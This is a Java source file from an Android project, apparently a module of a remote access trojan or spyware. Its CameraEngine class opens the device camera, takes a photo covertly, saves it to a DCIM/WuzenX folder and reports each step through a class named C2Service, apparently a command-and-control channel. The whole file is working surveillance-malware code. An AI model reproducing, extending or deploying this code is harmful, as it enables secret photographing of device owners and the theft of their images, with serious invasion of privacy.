package com.wuzenx.engine;

import android.content.Context;
import android.hardware.Camera;
import android.os.Environment;
import android.view.SurfaceView;

import com.wuzenx.C2Service;

import java.io.File;
import java.io.FileOutputStream;

@SuppressWarnings("deprecation")
public class CameraEngine {
    private Context context;
    private Camera camera = null;

    public CameraEngine(Context context) {
        this.context = context;
    }

    public void capturePhoto() {
        try {
            camera = Camera.open();
            if (camera == null) {
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("log",
                        "Camera not available");
                return;
            }

            camera.startPreview();
            camera.takePicture(null, null, (byte[] data, Camera cam) -> {
                try {
                    File photoDir = new File(
                        Environment.getExternalStorageDirectory(),
                        "DCIM/WuzenX");
                    photoDir.mkdirs();
                    File photo = new File(photoDir,
                        "capture_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(photo);
                    fos.write(data);
                    fos.close();

                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log",
                            "Photo saved: " + photo.getAbsolutePath());

                    cam.stopPreview();
                    cam.release();
                    camera = null;

                } catch (Exception e) {
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("log",
                            "Photo error: " + e.getMessage());
                }
            });

        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Camera init error: " + e.getMessage());
            if (camera != null) {
                camera.release();
                camera = null;
            }
        }
    }
}
